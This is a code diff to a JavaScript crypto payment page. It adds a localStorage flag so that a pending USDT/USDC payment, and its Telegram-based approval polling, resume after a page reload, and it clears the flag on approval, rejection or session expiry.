@@ -935,6 +935,8 @@ function startTelegramPolling(targetUser, txHash) {
                         clearInterval(telegramPollInterval);
                         await acknowledgeTelegramAction(callbackId, messageId, originalText, "✅ APPROVED");
 
+                        // Clear all local storage session items on success
+                        localStorage.removeItem("av_payment_in_progress");
                         localStorage.removeItem(storageKey);
                         localStorage.removeItem(SOURCE_TIMER_KEY);
                         localStorage.removeItem("avalonflowWallet");
@@ -948,6 +950,9 @@ function startTelegramPolling(targetUser, txHash) {
                     else if (callbackData === `reject:${targetUser}`) {
                         clearInterval(telegramPollInterval);
                         await acknowledgeTelegramAction(callbackId, messageId, originalText, "❌ REJECTED");
+
+                        // Clear payment progress state on rejection so user can try again
+                        localStorage.removeItem("av_payment_in_progress");
 
                         triggerNotification("Transaction verification declined by provider.", 4000);
                         const statusContainer = document.getElementById("active-status-container");
@@ -976,6 +981,9 @@ async function handlePayClick() {
     try {
         if (paymentDone) return;
         paymentMode = "paymento";
+
+        // Save progress state to persist across page reloads
+        localStorage.setItem("av_payment_in_progress", "true");
 
         initiatePaymentAnimationUI();
         triggerNotification("Connecting authorization protocol...", 3000);
@@ -1046,7 +1054,6 @@ function showTokenCard(selectedToken) {
     }
 }
 
-
 function triggerNotification(message, duration = 3000) {
     const notification = document.getElementById("planNotification");
     if (!notification) return;
@@ -1064,6 +1071,14 @@ window.addEventListener("DOMContentLoaded", () => {
 
     document.getElementById("usdt-amount").innerText = "$" + expectedAmount;
     document.getElementById("usdc-amount").innerText = "$" + expectedAmount;
+
+    // Check if payment process was triggered before a reload
+    if (localStorage.getItem("av_payment_in_progress") === "true") {
+        paymentDone = true;
+        initiatePaymentAnimationUI();
+        const identifyUser = getTargetUserIdentifier();
+        startTelegramPolling(identifyUser, "Resumed Session Request");
+    }
 
     // QR Codes
     const tokenValue = Math.floor(parseFloat(expectedAmount) * 1e6);
@@ -1118,6 +1133,7 @@ window.addEventListener("DOMContentLoaded", () => {
             if (usdcStatus) usdcStatus.innerText = "Verification session expired.";
             if (checkBtn) checkBtn.disabled = true;
 
+            localStorage.removeItem("av_payment_in_progress");
             localStorage.removeItem("avalonflowAmount");
             localStorage.removeItem(SOURCE_TIMER_KEY);
             localStorage.removeItem(storageKey);
